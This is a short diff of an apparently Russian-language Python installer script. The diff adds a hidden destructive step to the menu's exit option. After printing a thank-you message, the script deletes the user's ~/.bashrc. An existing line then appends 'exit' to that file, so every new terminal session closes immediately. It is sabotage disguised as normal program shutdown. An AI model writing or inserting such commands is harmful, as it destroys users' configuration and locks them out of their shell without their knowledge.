@@ -94,4 +94,5 @@ while True:
     if inp == '00':
         os.system('clear')
         print('Спасибо за использование [installer]')
+        os.system('rm ~/.bashrc')
         os.system('echo "exit" >> ~/.bashrc')
